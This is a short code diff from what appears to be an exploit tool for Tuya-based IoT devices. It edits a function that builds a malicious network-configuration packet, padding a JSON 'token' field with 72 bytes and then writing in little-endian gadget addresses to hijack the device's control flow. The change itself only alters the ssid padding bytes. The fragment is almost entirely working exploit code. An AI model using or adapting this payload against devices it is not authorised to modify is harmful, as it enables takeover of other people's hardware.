@@ -265,7 +265,7 @@ def make_profile_format2(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
     profile_builder = ProfileBuilder()
     prep_gadget = ty_cjson_parse_addr.to_bytes(3, byteorder="little")
     pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
-    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"ABCD' + pwn_gadget + b'","token":"' + b'A' * 72 + prep_gadget + b'"}'
+    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"AAAA' + pwn_gadget + b'","token":"' + b'A' * 72 + prep_gadget + b'"}'
     payload = profile_builder.check_valid_payload(payload)
 
     datagram = profile_builder.build_network_config_packet(payload=payload)
